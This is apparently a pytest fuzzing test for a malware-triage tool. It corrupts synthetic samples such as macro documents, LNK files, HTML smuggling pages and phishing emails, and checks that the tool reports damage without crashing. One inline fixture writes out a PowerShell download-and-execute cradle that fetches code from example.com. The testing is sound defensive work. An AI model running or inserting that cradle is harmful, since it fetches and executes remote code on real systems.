"""Malformed-input robustness (hard rule 6: fail loudly, never silently).

Every synthetic fixture is damaged in the ways hostile and corrupt files usually are:
truncated, bytes flipped, size fields set to extremes, chunks duplicated or removed,
regions zeroed. Each damaged file goes through the full pipeline with analyzers isolated
in worker processes, then through all three report writers. A damaged file may be
reported as anything, including "could not analyze"; what must never happen is an
exception escaping the pipeline or a writer, or a check that failed without the report
saying so.

The mutations are seeded, so a failure is reproducible: the test id names the fixture
and round. UNOPENED_FUZZ_ROUNDS raises the number of rounds per fixture (default 4).
"""

from __future__ import annotations

import os
import random
import struct
from collections.abc import Callable

import pytest
from fixtures import archives, build, lnk, mail, office, web

from unopened import pipeline
from unopened.analyzers import Options
from unopened.extraction import Limits
from unopened.model import INCOMPLETE_STATUSES
from unopened.report import html, json_report, markdown

ROUNDS = int(os.environ.get("UNOPENED_FUZZ_ROUNDS", "4"))

SEEDS: dict[str, tuple[str, Callable[[], bytes]]] = {
    "pe_exe": ("sample.exe", build.benign_exe),
    "pe_suspicious": ("sample.exe", build.suspicious_exe),
    "pe_dll64": ("sample.dll", build.benign_exe64),
    "ole_doc_macro": ("sample.doc", office.legacy_doc),
    "ole_package": ("sample.doc", office.ole_with_package),
    "ooxml_docm": ("sample.docm", office.docm),
    "ooxml_remote": ("sample.docx", office.docx_remote_template),
    "lnk": ("sample.lnk", lnk.encoded_powershell),
    "zip": ("sample.zip", lambda: archives.zip_plain({"a.txt": b"hello", "b.lnk":
                                                     lnk.encoded_powershell()})),
    "zip_crypto": ("sample.zip", lambda: archives.zip_crypto({"a.exe": build.benign_exe()})),
    "zip_nested": ("sample.zip", lambda: archives.nested_zip(3, {"x.txt": b"deep"})),
    "7z": ("sample.7z", lambda: archives.seven_zip({"a.txt": b"hello world" * 20})),
    "iso": ("sample.iso", lambda: archives.iso_image({"a.lnk": lnk.encoded_powershell(),
                                                      "b.dll": build.benign_dll()},
                                                     hidden={"b.dll"})),
    "pdf_js": ("sample.pdf", archives.pdf_openaction_js),
    "pdf_attachment": ("sample.pdf", archives.pdf_with_attachment),
    "eml": ("sample.eml", mail.phish_eml),
    "msg": ("sample.msg", mail.phish_msg),
    "html_smuggling": ("sample.html", web.smuggling_html_exe),
    "html_credentials": ("sample.html", web.credential_exfil_html),
    "svg_smuggling": ("sample.svg", web.svg_smuggling),
    "hta": ("sample.hta", web.hta_downloader),
    "wsf": ("sample.wsf", web.wsf_job),
    "rtf_package": ("sample.rtf", web.rtf_package),
    "rtf_equation": ("sample.rtf", web.rtf_equation_overflow),
    "vhd": ("sample.vhd", web.vhd_fixed),
    "script_ps": ("sample.ps1", lambda: (
        b"$u = 'https://example.com/a'\nIEX (New-Object Net.WebClient).DownloadString($u)\n"
        b"[Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAA=')\n")),
}


def mutate(data: bytes, rng: random.Random) -> bytes:
    buf = bytearray(data)
    for _ in range(rng.randint(1, 3)):
        if not buf:
            break
        kind = rng.randrange(6)
        pos = rng.randrange(len(buf))
        if kind == 0:  # truncate
            del buf[pos:]
        elif kind == 1:  # flip bytes
            for _ in range(rng.randint(1, 16)):
                i = rng.randrange(len(buf))
                buf[i] ^= 1 << rng.randrange(8)
        elif kind == 2 and pos + 4 <= len(buf):  # extreme size or offset field
            buf[pos:pos + 4] = struct.pack("<I", rng.choice(
                [0, 1, 0x7FFFFFFF, 0xFFFFFFFF, 0x80000000, len(buf) * 2]))
        elif kind == 3:  # duplicate a chunk
            chunk = bytes(buf[pos:pos + rng.randint(1, 4096)])
            buf[pos:pos] = chunk * rng.randint(1, 8)
        elif kind == 4:  # remove a chunk
            del buf[pos:pos + rng.randint(1, 512)]
        else:  # zero a region
            end = min(len(buf), pos + rng.randint(1, 256))
            buf[pos:end] = bytes(end - pos)
    return bytes(buf)


CASES = [(name, r) for name in SEEDS for r in range(ROUNDS)]


@pytest.fixture(scope="module")
def seeds() -> dict[str, bytes]:
    return {name: make() for name, (_, make) in SEEDS.items()}


@pytest.mark.parametrize("name,round_", CASES, ids=[f"{n}-{r}" for n, r in CASES])
def test_damaged_file_is_reported_not_crashed(name, round_, seeds, tmp_path):
    file_name, _ = SEEDS[name]
    rng = random.Random(f"{name}:{round_}")
    path = tmp_path / file_name
    path.write_bytes(mutate(seeds[name], rng))
    options = Options(timeout=30, file_timeout=120, timeouts={"floss": 30, "capa": 30},
                      limits=Limits(max_total_size=64 * 1024 * 1024,
                                    max_member_size=32 * 1024 * 1024))

    report = pipeline.triage(path, options)

    assert report.verdict.get("value") in {"malicious", "suspicious", "could not analyze",
                                           "no findings"}
    for result in report.results:
        if result.status in INCOMPLETE_STATUSES:
            # The failure is visible: the status table and the warning both carry it.
            assert result.message or result.errors, result.name
    md = markdown.render(report)
    assert "Warning: some checks did not complete" in md or not any(
        r.status in INCOMPLETE_STATUSES for r in report.results)
    json_report.render(report)
    page = html.render(report)
    assert "<script" not in page


def test_empty_and_tiny_files(tmp_path):
    for i, data in enumerate([b"", b"M", b"MZ", b"PK\x03\x04", b"%PDF-", b"\xd0\xcf\x11\xe0",
                              b"From: a\nTo: b\nSubject: c\n\n", b"7z\xbc\xaf\x27\x1c"]):
        path = tmp_path / f"tiny{i}.bin"
        path.write_bytes(data)
        report = pipeline.triage(path, Options(timeout=30))
        markdown.render(report)
        html.render(report)
